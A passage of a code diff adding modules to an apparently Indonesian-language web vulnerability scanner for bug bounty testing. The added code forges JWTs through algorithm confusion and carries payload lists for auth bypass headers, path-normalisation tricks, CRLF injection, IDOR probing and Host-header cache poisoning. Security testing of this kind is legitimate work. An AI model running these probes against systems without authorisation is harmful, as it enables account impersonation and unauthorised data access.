+        f.append(("INFO","JWT_ALG_CONFUSION_SURFACE",
+                  f"Public key server bisa diambil publik di {key_url}. Kalau verifier memilih algoritma dari klaim "
+                  f"'alg' di token, kunci ini bisa dipakai untuk menandatangani token HS256 (alg confusion).",
+                  key_url, None), evidence_url=key_url)
+        # PoC klasik: header mengaku RS256, tapi tanda tangannya HMAC memakai public key.
+        forgeries.append(("JWT_ALG_CONFUSION",
+                          jwt_sign({"alg": "RS256", "typ": "JWT"}, claims, key_text, sign_alg="HS256")))
+
+    forgery_text = {
+        "JWT_KID_TRAVERSAL": ("Klaim 'kid' dipakai server untuk memuat file kunci, jadi penyerang bisa "
+                              "mengarahkannya ke file kosong (path traversal) lalu menandatangani token dengan kunci "
+                              "kosong. Token buatan penyerang diterima sebagai pengguna sah."),
+        "JWT_ALG_CONFUSION": ("Verifier memilih algoritma dari klaim 'alg' di token, sehingga token yang "
+                              "ditandatangani memakai public key server (HMAC) diterima sebagai token sah. "
+                              "Penyerang bisa mengaku sebagai pengguna mana pun tanpa memiliki kunci privat."),
+    }
+    for code, token in forgeries:
+        if token is None:
+            continue
+        for url, fingerprint in targets:
+            if not jwt_accepted(sess, url, token, fingerprint):
+                continue
+            critical(f"{code} terkonfirmasi di {url}")
+            f.append(("HIGH", code,
+                      f"Token palsu buatan penyerang diterima server di {url} (HTTP 200 tanpa kredensial valid). "
+                      f"{forgery_text[code]}",
+                      url, f"{code} terkonfirmasi di {url}", "firm"), evidence_url=url)
+
+    for _where, name, token in tokens:
+        parts = jwt_parts(token)
+        if parts is None:
+            continue
+        payload = parts[1]
+        for url, fingerprint in targets:
+            if not jwt_accepted(sess, url, token, fingerprint):
+                continue
+            if jwt_expired(payload):
+                warn(f"Token kedaluwarsa masih diterima di {url}")
+                f.append(("HIGH","JWT_EXPIRED_ACCEPTED",
+                          f"Token {name} dari sesi tester sudah lewat masa berlaku (`exp` = {payload.get('exp')}) tapi "
+                          f"tetap diterima di {url}. Server tidak memeriksa klaim `exp`, jadi token yang bocor atau "
+                          f"tercuri tetap berlaku selamanya.",
+                          url, f"Token kedaluwarsa masih diterima di {url}", "firm"), evidence_url=url)
+            elif "exp" not in payload:
+                info(f"Token {name} diterima di {url} tanpa klaim exp")
+                f.append(("LOW","JWT_NO_EXPIRY",
+                          f"Token {name} diterima di {url} tapi tidak membawa klaim `exp`, jadi token ini tidak punya "
+                          f"masa berlaku. Sekali bocor atau tercuri, token itu bisa dipakai selamanya.",
+                          url, f"Token tanpa klaim exp diterima di {url}", "tentative"), evidence_url=url)
     return f
 
 def scan_subdomains(sess, base_url, ctx=None):
@@ -2041,6 +2590,908 @@ def waf_detect(sess, base_url, ctx=None):
         if "attention required" in r.text.lower() and "cloudflare" in r.text.lower(): detected.append("Cloudflare")
     except: pass
     return detected
+
+# ══════════════════════════════════════════════════════════════════
+# MODUL KELAS KERENTANAN TAMBAHAN (roadmap bug bounty bagian 2)
+# ══════════════════════════════════════════════════════════════════
+
+# Path terlindungi yang lazim jadi titik uji bypass otorisasi.
+AUTH_BYPASS_PATHS = ("/admin", "/admin/area", "/administrator/", "/dashboard",
+                     "/api/admin", "/api/v1/admin", "/internal", "/manage", "/panel")
+
+# Header yang lazim dipercaya reverse proxy/backend untuk menandai origin internal.
+AUTH_BYPASS_HEADERS = (
+    ("X-Original-URL", "/"), ("X-Rewrite-URL", "/"),
+    ("X-Forwarded-For", "127.0.0.1"), ("X-Client-IP", "127.0.0.1"),
+    ("X-Remote-Addr", "127.0.0.1"), ("X-Originating-IP", "127.0.0.1"),
+    ("X-Custom-IP-Authorization", "127.0.0.1"), ("X-HTTP-Method-Override", "GET"),
+)
+
+API_SPEC_PATHS = ("/openapi.json", "/swagger.json", "/v3/api-docs", "/api-docs",
+                  "/.well-known/openapi.json", "/api/swagger.json")
+
+# Endpoint terlindungi yang lazim dipakai untuk menguji token JWT.
+JWT_PROTECTED_PATHS = ("/api/me", "/jwt/protected", "/api/profile", "/api/v1/me",
+                       "/me", "/profile", "/api/user")
+
+# Lokasi public key / JWKS yang dipakai uji alg confusion.
+JWT_KEY_PATHS = ("/jwks.pem", "/.well-known/jwks.json", "/jwks.json",
+                 "/.well-known/openid-configuration")
+
+# Nama parameter yang paling sering dipakai aplikasi (parameter discovery).
+PARAM_WORDLIST = (
+    "id", "page", "debug", "test", "admin", "user", "username", "email", "name",
+    "q", "s", "search", "query", "filter", "sort", "order", "dir", "view", "action",
+    "type", "mode", "lang", "locale", "format", "output", "file", "path", "url",
+    "redirect", "next", "token", "key", "api_key", "callback", "json", "xml", "data",
+    "value", "cmd", "host", "target", "template", "theme", "version", "v", "ref", "source",
+)
+
+CRLF_PAYLOADS = (
+    ("%0d%0aX-Spade-Injected:1", "CRLF ganda"),
+    ("%0d%0aSet-Cookie:spade=1", "CRLF + Set-Cookie"),
+    ("%0d%0a%0d%0a<spade>", "response splitting"),
+    ("%E5%98%8A%E5%98%8DSpade-Injected:1", "unicode CRLF"),
+)
+
+# Path kandidat khusus uji OOB (hanya dikirim saat --oob-host aktif).
+OOB_SSRF_PATHS = ("/ssrf-sink", "/fetch", "/proxy", "/api/fetch", "/api/url", "/url")
+OOB_XXE_PATHS = ("/xml-oob", "/api/xml", "/xml", "/soap", "/api/upload")
+OOB_CMDI_PATHS = ("/ping", "/exec", "/cmd", "/run", "/api/exec")
+
+CACHE_MARKER_HEADERS = ("X-Cache", "X-Cache-Hits", "CF-Cache-Status", "Age", "X-Cache-Status")
+
+JWT_HMAC_ALGS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
+JWT_ASYM_ALGS = ("RS", "ES", "PS")
+
+def _ctx_flag(ctx, key):
+    """Baca flag boolean dari ctx tanpa pecah kalau ctx kosong/None."""
+    return bool((ctx or {}).get(key))
+
+def _resp_fingerprint(resp):
+    """Sidik ringkas respons (status, ukuran, hash body) untuk perbandingan."""
+    if resp is None:
+        return None
+    content = resp.content or b""
+    return (resp.status_code, len(content), hashlib.sha256(content).hexdigest()[:16])
+
+def _is_spa_catchall(resp, ctx):
+    """True kalau respons ini cuma halaman catch-all SPA, bukan resource asli."""
+    baseline = (ctx or {}).get("baseline")
+    if resp is None or not baseline or baseline.get("detected") != "spa_catchall":
+        return False
+    if hash(resp.content) == baseline.get("content_hash"):
+        return True
+    return bool(baseline.get("is_html")) and len(resp.content) == baseline.get("size")
+
+def _looks_like_login(text):
+    """Heuristik halaman login: respons seperti ini bukan bukti akses tidak sah."""
+    low = (text or "")[:5000].lower()
+    if "type=\"password\"" in low or "type='password'" in low:
+        return True
+    return "<form" in low and ("login" in low or "sign in" in low or "masuk" in low)
+
+def _object_payload(resp, ctx, ident=None):
+    """True kalau respons tampak sebagai payload objek (bukan login/catch-all)."""
+    if resp is None or resp.status_code not in (200, 201) or _is_spa_catchall(resp, ctx):
+        return False
+    text = resp.text or ""
+    if _looks_like_login(text):
+        return False
+    ctype = (resp.headers.get("Content-Type") or "").lower()
+    if "json" in ctype:
+        try:
+            payload = resp.json()
+        except Exception:
+            return False
+        return bool(payload)
+    if ident and ident in text and len(text) < 100000:
+        return True
+    return False
+
+def _sibling_identifier(value):
+    """ID tetangga dari sebuah ID numerik/UUID; None kalau nilainya bukan ID."""
+    value = (value or "").strip()
+    if re.fullmatch(r"[0-9]{1,9}", value):
+        return str(int(value) + 1)
+    if re.fullmatch(r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}", value):
+        head, _, tail = value.rpartition("-")
+        return f"{head}-{min(int(tail, 16) + 1, 0xFFFFFFFFFFFF):012x}"
+    return None
+
+def _idor_candidates(base_url, ctx):
+    """Kandidat uji IDOR: (url_asli, url_tetangga, lokasi, ID yang diubah)."""
+    crawler = (ctx or {}).get("crawler")
+    urls = list(crawler.pages) if crawler and crawler.pages else []
+    urls.append(base_url)
+    for action, method, _inputs, _page in get_forms(ctx):
+        if method.upper() == "GET":
+            urls.append(join(base_url, action))
+    out, seen = [], set()
+    for url in urls:
+        parsed = urllib.parse.urlparse(url)
+        pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
+        for name, value in pairs:
+            sibling = _sibling_identifier(value)
+            if sibling is None:
+                continue
+            query = urllib.parse.urlencode([(n, sibling if n == name else v) for n, v in pairs])
+            neighbor = urllib.parse.urlunparse(parsed._replace(query=query))
+            if (url, neighbor) not in seen:
+                seen.add((url, neighbor))
+                out.append((url, neighbor, f"query '{name}'", value))
+        segments = parsed.path.split("/")
+        for index, segment in enumerate(segments):
+            sibling = _sibling_identifier(segment)
+            if sibling is None:
+                continue
+            replaced = list(segments)
+            replaced[index] = sibling
+            neighbor = urllib.parse.urlunparse(parsed._replace(path="/".join(replaced)))
+            if (url, neighbor) not in seen:
+                seen.add((url, neighbor))
+                out.append((url, neighbor, f"path '{segment}'", segment))
+    return out[:IDOR_MAX_CANDIDATES]
+
+# ── Bodi modul kelas kerentanan tambahan (roadmap bug bounty bagian 2) ──
+#
+# Konvensi hasil internal modul baru di blok ini: tuple 6 elemen
+#   (severity, kode, deskripsi, url_bukti, pesan_terminal, confidence)
+# di mana `confidence=None` berarti "pakai default dari FINDING_META".
+# Semua modul memakai ThreadLocalSession (curl_cffi) dan menghormati flag
+# ctx: auth_enabled, anon_sess, active_writes, check_smuggling, oob_host.
+
+def scan_idor(sess, base_url, ctx=None):
+    """Uji otorisasi tingkat objek (IDOR/BOLA) dengan sesi autentikasi vs anonim.
+
+    Modul ini butuh sesi autentikasi (`--cookie`/`-H`/`--bearer`). Membandingkan
+    dua sesi adalah satu-satunya cara membedakan objek milik tester dari objek
+    milik pengguna lain tanpa mengubah data. Tanpa sesi, modul dilewati dengan
+    catatan — bukan diklaim bersih.
+    """
+    f = FindingList(base_url); info("Menguji IDOR/BOLA (otorisasi objek)...")
+    anon = (ctx or {}).get("anon_sess")
+    if not _ctx_flag(ctx, "auth_enabled") or anon is None:
+        info("  (dilewati: butuh sesi autentikasi — pakai --cookie/-H/--bearer)")
+        return f
+    candidates = _idor_candidates(base_url, ctx)
+    if not candidates:
+        info("  Tidak ada URL ber-ID dari crawl — tidak ada kandidat")
+        return f
+    info(f"  {len(candidates)} kandidat objek diuji")
+
+    def _probe(job):
+        self_url, neighbor, where, ident = job
+        try:
+            authed_self = sess.get(self_url, timeout=10)
+            anon_self = anon.get(self_url, timeout=10)
+        except Exception:
+            return []
+        # Prasyarat: URL ini objek milik tester (200) dan anonim ditolak (401/403).
+        if authed_self.status_code != 200 or anon_self.status_code not in (401, 403):
+            return []
+        if _is_spa_catchall(authed_self, ctx) or not _object_payload(authed_self, ctx, ident):
+            return []
+        self_fp = _resp_fingerprint(authed_self)
+        anon_fp = _resp_fingerprint(anon_self)
+        sibling = _sibling_identifier(ident)
+        try:
+            anon_neighbor = anon.get(neighbor, timeout=10)
+        except Exception:
+            anon_neighbor = None
+        # Objek tetangga terbaca TANPA autentikasi: bukti terkuat (tidak perlu akun).
+        if _object_payload(anon_neighbor, ctx, sibling) and _resp_fingerprint(anon_neighbor) not in (anon_fp, self_fp):
+            return [("HIGH", "IDOR_ANON",
+                     f"Objek tetangga dari {where} dapat dibaca tanpa autentikasi di {neighbor}, padahal objek "
+                     f"pada URL aslinya menolak anonim (HTTP {anon_self.status_code}). Server tidak memeriksa "
+                     f"kepemilikan objek sebelum mengembalikan data, jadi siapa pun bisa membaca data pengguna "
+                     f"lain hanya dengan mengubah ID.",
+                     neighbor, f"IDOR/BOLA akses anonim: {neighbor}", "firm")]
+        try:
+            authed_neighbor = sess.get(neighbor, timeout=10)
+        except Exception:
+            return []
+        # Objek tetangga terbaca sesi tester, anonim ditolak: curiga kuat, verifikasi manual.
+        if _object_payload(authed_neighbor, ctx, sibling) and _resp_fingerprint(authed_neighbor) != self_fp:
+            return [("MEDIUM", "IDOR_READ",
+                     f"Objek lain lewat {where} ({neighbor}) mengembalikan payload berbeda dari objek tester "
+                     f"meski anonim ditolak (HTTP {anon_self.status_code}). Kalau objek itu bukan milik akun "
+                     f"tester, ini IDOR/BOLA — perlu dicek manual dengan akun kedua.",
+                     neighbor, f"Curiga IDOR: {neighbor}", "tentative")]
+        return []
+
+    seen = set()
+    for out in pmap(_probe, candidates):
+        for sev, code, desc, url, message, confidence in out:
+            if (code, url) in seen:
+                continue
+            seen.add((code, url))
+            warn(message)
+            f.append((sev, code, desc, url), evidence_url=url, confidence=confidence)
+    return f
+
+# Token anti-CSRF yang lazim dipakai framework (name/id field form).
+CSRF_TOKEN_RE = re.compile(r"(csrf|xsrf|authenticity|antiforgery|_token|nonce)", re.I)
+
+def _form_payload(inputs, overrides=None):
+    """Rakit body form dari input hasil parser (field file dilewati)."""
+    data = OrderedDict()
+    for inp in inputs or ():
+        name = inp.get("name")
+        if not name or inp.get("type") == "file":
+            continue
+        data[name] = overrides[name] if overrides and name in overrides else (inp.get("value") or "spade")
+    return dict(data)
+
+def scan_csrf(sess, base_url, ctx=None):
+    """Cari form POST rentan CSRF.
+
+    Cek pasif (selalu jalan): form POST tanpa field token = indikasi `CSRF_NO_TOKEN`
+    (confidence tentative). Cek aktif — kirim submit dengan token palsu + header
+    `Origin`/`Referer` asing — hanya jalan dengan `--active-writes` karena mengirim
+    POST ke aplikasi target.
+    """
+    f = FindingList(base_url); info("Menguji proteksi CSRF...")
+    forms = [form for form in get_forms(ctx) if form[1].upper() == "POST"]
+    if not forms:
+        info("  Tidak ada form POST dari crawl")
+        return f
+    active = _ctx_flag(ctx, "active_writes")
+    info(f"  {len(forms)} form POST diperiksa" + ("" if active else " (uji aktif dengan token palsu: tambah --active-writes)"))
+
+    def _inspect(job):
+        action, inputs, page = job
+        if any((inp.get("type") == "password") for inp in inputs):
+            return []      # form login: bukan bukti CSRF
+        token_fields = [inp["name"] for inp in inputs if inp.get("name") and CSRF_TOKEN_RE.search(inp["name"])]
+        if not token_fields:
+            return [("MEDIUM", "CSRF_NO_TOKEN",
+                     f"Form POST di {page} (action: {action}) tidak punya field token anti-CSRF. Kalau form ini "
+                     f"mengubah state dan autentikasi hanya lewat cookie, situs lain bisa mengirimkan form ini "
+                     f"atas nama korban (CSRF).",
+                     action, f"Form POST tanpa token CSRF: {action}", "tentative")]
+        if not active:
+            return []
+        headers = {"Origin": "https://spade-invalid.example", "Referer": "https://spade-invalid.example/"}
+        try:
+            valid_resp = sess.post(action, data=_form_payload(inputs), headers=headers, timeout=10)
+            forged_resp = sess.post(action, data=_form_payload(inputs, {n: "spade-forged-token" for n in token_fields}),
+                                    headers=headers, timeout=10)
+        except Exception:
+            return []
+        accepted = (200, 201, 204, 302)
+        if forged_resp.status_code not in accepted or valid_resp.status_code not in accepted:
+            return []      # token palsu ditolak: proteksi CSRF bekerja
+        if _resp_fingerprint(forged_resp) != _resp_fingerprint(valid_resp):
+            return []      # respons berbeda: kemungkinan besar ditolak
+        if _looks_like_login(forged_resp.text):
+            return []
+        return [("MEDIUM", "CSRF_TOKEN_IGNORED",
+                 f"Form POST di {page} (action: {action}) memang mengirim field token ({', '.join(token_fields)}) "
+                 f"tapi server menerima nilai palsu dengan respons identik. Token tidak benar-benar divalidasi, "
+                 f"jadi proteksi CSRF-nya kosong.",
+                 action, f"Token CSRF diabaikan server: {action}", "firm")]
+
+    for out in pmap(_inspect, [(action, inputs, page) for action, _method, inputs, page in forms]):
+        for sev, code, desc, url, message, confidence in out:
+            if code == "CSRF_TOKEN_IGNORED":
+                warn(message)
+            else:
+                info(message)
+            f.append((sev, code, desc, url), evidence_url=url, confidence=confidence)
+    return f
+def _http_origin(base_url):
+    """Origin (scheme://host) dari sebuah URL."""
+    parsed = urllib.parse.urlparse(base_url)
+    return f"{parsed.scheme}://{parsed.netloc}"
+
+def _auth_bypass_variants(base_url, denied_url):
+    """Varian normalisasi path yang lazim melewati ACL reverse proxy."""
+    parsed = urllib.parse.urlparse(denied_url)
+    path = parsed.path or "/"
+    clean = "/" + path.lstrip("/")
+    trimmed = clean.rstrip("/") or "/"
+    variants = [
+        ("trailing slash", clean if clean.endswith("/") else clean + "/"),
+        ("trailing dot", trimmed + "/."),
+        ("semicolon segment", trimmed + "/..;/"),
+        ("double slash", "//" + clean.lstrip("/")),
+        ("dot segment", clean.replace("/", "/./", 1)),
+        ("encoded dot", clean.replace("/", "/%2e/", 1)),
+        ("dot json", trimmed + ".json"),
+        ("trailing space", clean + "%20"),
+        ("semicolon suffix", trimmed + "/;/"),
+    ]
+    out, seen = [], set()
+    for label, candidate in variants:
+        if candidate == path or candidate in seen:
+            continue
+        seen.add(candidate)
+        suffix = f"?{parsed.query}" if parsed.query else ""
+        out.append((label, _http_origin(base_url) + candidate + suffix))
+    return out
+
+def scan_auth_bypass(sess, base_url, ctx=None):
+    """Cari bypass otorisasi (401/403 bypass) lewat header internal dan normalisasi path.
+
+    Kandidat = URL yang ditolak untuk sesi anonim (401/403) dan bukan halaman login.
+    Kalau varian header (`X-Original-URL`, `X-Forwarded-For: 127.0.0.1`, ...) atau
+    varian path (`..;/`, `//`, `%2e/`, ...) mengembalikan 200 dengan isi berbeda dari
+    body penolakan, ACL-nya bisa dilewati.
+    """
+    f = FindingList(base_url); info("Menguji auth bypass (bypass 401/403)...")
+    anon = (ctx or {}).get("anon_sess") or sess
+    candidates = [join(base_url, path) for path in AUTH_BYPASS_PATHS]
+    crawler = (ctx or {}).get("crawler")
+    if crawler and crawler.pages:
+        candidates.extend(list(crawler.pages)[:3])
+
+    denied = []
+    for url in candidates:
+        if len(denied) >= AUTH_BYPASS_MAX_PATHS:
+            break
+        try:
+            resp = anon.get(url, timeout=10)
+        except Exception:
+            continue
+        if resp.status_code in (401, 403) and not _looks_like_login(resp.text):
+            denied.append((url, resp))
+    if not denied:
+        info("  Tidak ada path terproteksi (401/403) untuk diuji")
+        return f
+    info(f"  {len(denied)} path terproteksi diuji "
+         f"({len(AUTH_BYPASS_HEADERS)} varian header, 9 varian path)")
+
+    def _accepted(resp, denial_fp):
+        """True kalau respons ini bukti ACL terlewati (bukan login/SPA/body penolakan)."""
+        if resp is None or resp.status_code not in (200, 201, 204):
+            return False
+        if _looks_like_login(resp.text) or _is_spa_catchall(resp, ctx):
+            return False
+        return _resp_fingerprint(resp) != denial_fp
+
+    def _check_header(job):
+        url, denial_fp, name, value = job
+        try:
+            resp = anon.get(url, headers={name: value}, timeout=10)
+        except Exception:
+            return []
+        if not _accepted(resp, denial_fp):
+            return []
+        return [("HIGH", "AUTH_BYPASS_HEADER",
+                 f"Halaman terproteksi {url} menolak akses anonim (401/403), tapi header '{name}: {value}' "
+                 f"membuat server mengembalikan konten. Reverse proxy/backend mempercayai header penanda "
+                 f"origin internal yang bisa dipalsukan siapa pun — autentikasi bisa dilewati.",
+                 url, f"Auth bypass via header {name}: {url}", "firm")]
+
+    def _check_path(job):
+        url, denial_fp, label = job
+        try:
+            resp = anon.get(url, timeout=10)
+        except Exception:
+            return []
+        if not _accepted(resp, denial_fp):
+            return []
+        return [("HIGH", "AUTH_BYPASS_PATH",
+                 f"Halaman terproteksi {url} bisa diakses anonim dengan varian path ({label}). "
+                 f"Reverse proxy dan aplikasi menormalkan path berbeda-beda, sehingga aturan ACL "
+                 f"dilewati tanpa autentikasi.",
+                 url, f"Auth bypass via normalisasi path ({label}): {url}", "firm")]
+
+    header_jobs, path_jobs = [], []
+    for url, denial in denied:
+        denial_fp = _resp_fingerprint(denial)
+        header_jobs.extend((url, denial_fp, name, value) for name, value in AUTH_BYPASS_HEADERS)
+        path_jobs.extend((variant, denial_fp, label) for label, variant in _auth_bypass_variants(base_url, url))
+
+    seen = set()
+    for out in list(pmap(_check_header, header_jobs)) + list(pmap(_check_path, path_jobs)):
+        for sev, code, desc, url, message, confidence in out:
+            if (code, url) in seen:
+                continue
+            seen.add((code, url))
+            warn(message)
+            f.append((sev, code, desc, url), evidence_url=url, confidence=confidence)
+    return f
+
+def _json_object(resp):
+    """Body JSON dict dari sebuah respons, atau None kalau bukan JSON objek."""
+    if resp is None or resp.status_code != 200:
+        return None
+    text = resp.text or ""
+    ctype = (resp.headers.get("Content-Type") or "").lower()
+    if "json" not in ctype and not text.lstrip().startswith("{"):
+        return None
+    try:
+        payload = resp.json()
+    except Exception:
+        return None
+    return payload if isinstance(payload, dict) else None
+
+def _is_api_spec(payload):
+    """True kalau dokumen JSON ini spesifikasi API (OpenAPI/Swagger)."""
+    return isinstance(payload, dict) and any(key in payload for key in ("openapi", "swagger", "paths", "swaggerVersion"))
+
+def _spec_endpoints(spec):
+    """Panen path + nama parameter dari dokumen OpenAPI/Swagger."""
+    endpoints, params = [], []
+    paths = spec.get("paths")
+    if not isinstance(paths, dict):
+        return endpoints, params
+    for path, operations in paths.items():
+        if isinstance(path, str):
+            endpoints.append(path)
+        if not isinstance(operations, dict):
+            continue
+        for operation in operations.values():
+            if not isinstance(operation, dict):
+                continue
+            for param in operation.get("parameters") or ():
+                if isinstance(param, dict) and param.get("name"):
+                    params.append(str(param["name"]))
+            body = operation.get("requestBody")
+            content = body.get("content") if isinstance(body, dict) else None
+            if isinstance(content, dict):
+                for media in content.values():
+                    schema = media.get("schema") if isinstance(media, dict) else None
+                    properties = schema.get("properties") if isinstance(schema, dict) else None
+                    if isinstance(properties, dict):
+                        params.extend(str(name) for name in properties)
+    return endpoints, params
+
+def scan_api_specs(sess, base_url, ctx=None):
+    """Cari dokumen spesifikasi API (OpenAPI/Swagger) yang terekspos.
+
+    Selain melaporkan `API_SPEC_EXPOSED`, modul ini memanen daftar endpoint dan nama
+    parameter ke `ctx["api_endpoints"]`/`ctx["api_params"]` supaya modul injection
+    (SQLi/XSS/LFI) ikut menguji parameter yang tidak muncul di HTML.
+    """
+    f = FindingList(base_url); info("Mencari spesifikasi API (OpenAPI/Swagger)...")
+
+    def _probe(path):
+        url = join(base_url, path)
+        try:
+            resp = sess.get(url, timeout=10)
+        except Exception:
+            return None
+        if _is_spa_catchall(resp, ctx) or _looks_like_login(resp.text):
+            return None
+        spec = _json_object(resp)
+        if spec is None or not _is_api_spec(spec):
+            return None
+        return url, spec
+
+    for result in pmap(_probe, API_SPEC_PATHS):
+        if result is None:
+            continue
+        url, spec = result
+        endpoints, params = _spec_endpoints(spec)
+        if isinstance(ctx, dict):
+            if endpoints:
+                ctx["api_endpoints"] = list(dict.fromkeys(endpoints))[:50]
+            if params:
+                ctx["api_params"] = list(dict.fromkeys(params))[:50]
+        warn(f"Spesifikasi API terekspos: {url}")
+        f.append(("MEDIUM", "API_SPEC_EXPOSED",
+                  f"Dokumen spesifikasi API dapat diakses publik di {url}. Dokumen ini membocorkan daftar "
+                  f"endpoint ({len(endpoints)} path) dan nama parameter yang dipakai server — bahan langsung "
+                  f"untuk mencari endpoint tanpa autentikasi atau parameter tersembunyi.",
+                  url, f"Spesifikasi API terekspos: {url}", "firm"), evidence_url=url)
+        break
+    return f
+
+def spec_injection_targets(ctx):
+    """Nama parameter hasil panen spesifikasi API untuk modul injection (kalau ada)."""
+    return [str(name) for name in ((ctx or {}).get("api_params") or []) if name]
+
+def scan_params(sess, base_url, ctx=None):
+    """Parameter discovery: cari parameter tak terlihat yang mengubah respons.
+
+    Daftar kata (`PARAM_WORDLIST`) dikirim satu per satu ke URL yang sudah dikenal;
+    respons dibandingkan dengan baseline URL tersebut (status + ukuran). Temuan ini
+    informasional — hanya penunjuk arah untuk uji manual lanjutan.
+    """
+    f = FindingList(base_url); info("Mencari parameter tersembunyi...")
+    crawler = (ctx or {}).get("crawler")
+    urls = list(crawler.pages)[:PARAM_MAX_URLS] if crawler and crawler.pages else []
+    if base_url not in urls:
+        urls.insert(0, base_url)
+    urls = urls[:PARAM_MAX_URLS]
+    if _is_spa_catchall(get_base_response(sess, base_url, ctx), ctx):
+        info("  (dilewati: SPA catch-all — semua URL mengembalikan halaman yang sama)")
+        return f
+    info(f"  {len(urls)} URL x {len(PARAM_WORDLIST)} nama parameter diuji")
+
+    # Baseline diambil berurutan (1 request per URL) supaya probe parameter bisa
+    # dipetakan paralel sebagai satu daftar job rata: memanggil pmap di dalam pmap
+    # akan mengunci thread worker (yang menunggu) sampai executor kehabisan worker.
+    baselines = {}
+    for url in urls:
+        try:
+            baseline = sess.get(url, timeout=10)
+        except Exception:
+            continue
+        if baseline.status_code == 200:
+            baselines[url] = (baseline.status_code, len(baseline.content))
+    jobs = [(url, name) for url in baselines for name in PARAM_WORDLIST]
+    if not jobs:
+        return f
+
+    def _check(job):
+        url, name = job
+        status, size = baselines[url]
+        try:
+            resp = sess.get(url, params={name: "spade1"}, timeout=10)
+        except Exception:
+            return None
+        if resp.status_code != status and resp.status_code in (200, 500):
+            return url, name, f"status {status} -> {resp.status_code}"
+        delta = len(resp.content) - size
+        if abs(delta) > 32:
+            return url, name, f"ukuran respons berubah {size} -> {len(resp.content)} byte"
+        return None
+
+    seen = set()
+    for result in pmap(_check, jobs):
+        if not result:
+            continue
+        url, name, why = result
+        if (url, name) in seen:
+            continue
+        seen.add((url, name))
+        info(f"  Parameter tersembunyi: '{name}' ({why})")
+        f.append(("INFO", "PARAM_DISCOVERY",
+                  f"Parameter '{name}' tidak ada di HTML/form tapi mengubah respons {url} ({why}). "
+                  f"Parameter tersembunyi sering membuka fitur debug, filter data, atau alur yang tidak "
+                  f"didokumentasikan — layak diuji manual.",
+                  url, None), evidence_url=url)
+    return f
+def _cache_marker(resp):
+    """True kalau respons tampak melewati cache (header cache atau Cache-Control publik)."""
+    if resp is None:
+        return False
+    for name in CACHE_MARKER_HEADERS:
+        if resp.headers.get(name):
+            return True
+    control = (resp.headers.get("Cache-Control") or "").lower()
+    return "public" in control or "max-age" in control
+
+def scan_host_header(sess, base_url, ctx=None):
+    """Uji Host header injection, cache poisoning, dan web cache deception."""
+    f = FindingList(base_url); info("Menguji Host header & cache...")
+    canary = f"spade-{secrets.token_hex(4)}.invalid"
+    targets = []
+    crawler = (ctx or {}).get("crawler")
+    if crawler and crawler.pages:
+        targets.extend(list(crawler.pages)[:4])
+    if base_url not in targets:
+        targets.insert(0, base_url)
+    targets = targets[:5]
+
+    def _host_probe(job):
+        url, name = job
+        value = f"host={canary}" if name == "Forwarded" else canary
+        try:
+            resp = sess.get(url, headers={name: value}, timeout=10)
+        except Exception:
+            return []
+        location = resp.headers.get("Location") or ""
+        cookie = resp.headers.get("Set-Cookie") or ""
+        body = resp.text or ""
+        out = []
+        if canary in location or canary in cookie:
+            out.append(("MEDIUM", "HOST_HEADER_INJECTION",
+                        f"Header '{name}' dipakai apa adanya di header respons (Location/Set-Cookie) untuk {url}. "
+                        f"Penyerang bisa mengarahkan korban ke domainnya sendiri (web cache poisoning, reset "
+                        f"password poisoning, atau pencurian token).",
+                        url, f"Host header injection ({name}) di {url}", "firm"))
+        elif canary in body:
+            out.append(("MEDIUM", "HOST_HEADER_INJECTION",
+                        f"Nilai header '{name}' dipantulkan mentah ke body respons {url}. Perlu dikonfirmasi "
+                        f"manual apakah nilai ini dipakai di tautan/redirect, karena itu jalan menuju cache "
+                        f"poisoning.",
+                        url, f"Host header dipantulkan di body ({name}) di {url}", "tentative"))
+        if canary in body and _cache_marker(resp):
+            out.append(("MEDIUM", "CACHE_POISONING",
+                        f"Respons {url} lewat cache (ada marker cache/Cache-Control publik) dan nilai header "
+                        f"'{name}' yang dipalsukan ikut tersimpan di body. Cache bisa meracuni pengguna lain "
+                        f"dengan konten berisi domain penyerang.",
+                        url, f"Indikasi cache poisoning via {name} di {url}", "tentative"))
+        return out
+
+    jobs = [(url, name) for url in targets for name in ("Host", "X-Forwarded-Host", "X-Host", "X-Forwarded-Server", "Forwarded")]
+    seen = set()
+    for out in pmap(_host_probe, jobs):
+        for sev, code, desc, url, message, confidence in out:
+            if (code, url) in seen:
+                continue
+            seen.add((code, url))
+            warn(message)
+            f.append((sev, code, desc, url), evidence_url=url, confidence=confidence)
+
+    # ── Cache deception: halaman privat diakses anonim lewat akhiran aset statis ──
+    anon = (ctx or {}).get("anon_sess")
+    if _ctx_flag(ctx, "auth_enabled") and anon is not None:
+        decoy = "/spade-nonexistent.css"
+        deception_targets = [join(base_url, path) for path in AUTH_BYPASS_PATHS]
+        if crawler and crawler.pages:
+            deception_targets.extend(list(crawler.pages)[:3])
+
+        def _deception(url):
+            try:
+                authed = sess.get(url, timeout=10)
+                denied = anon.get(url, timeout=10)
+            except Exception:
+                return []
+            if authed.status_code != 200 or denied.status_code not in (401, 403):
+                return []
+            fake = url.rstrip("/") + decoy
+            try:
+                cached = anon.get(fake, timeout=10)
+            except Exception:
+                return []
+            if cached.status_code != 200:
+                return []
+            if _resp_fingerprint(cached) != _resp_fingerprint(authed):
+                return []
+            confidence = "firm" if _cache_marker(cached) else "tentative"
+            return [("MEDIUM", "CACHE_DECEPTION",
+                     f"Halaman privat {url} hanya bisa dibuka sesi terautentikasi, tapi versi berakhiran aset "
+                     f"statis ({fake}) melayani isi yang sama ke pengunjung anonim. Cache/CDN menyimpan respons "
+                     f"itu, sehingga data privat bisa terbaca siapa pun.",
+                     fake, f"Cache deception: {fake} membocorkan halaman privat", confidence)]
+
+        for out in pmap(_deception, deception_targets):
+            for sev, code, desc, url, message, confidence in out:
+                warn(message)
+                f.append((sev, code, desc, url), evidence_url=url, confidence=confidence)
+    return f
+
+CRLF_TARGET_PATHS = ("/redirect", "/login", "/logout", "/api/redirect")
+CRLF_PARAMS = ("next", "url", "redirect", "return", "to", "dest", "goto", "target",
+               "continue", "callback", "path", "file", "page", "ref", "u")
+CRLF_MAX_JOBS = 120
+
+def _raw_query_url(url, param, payload):
+    """URL dengan payload mentah di query (tanpa encode ulang).
+
+    Payload CRLF memakai escape `%0d%0a` yang harus sampai apa adanya; kalau
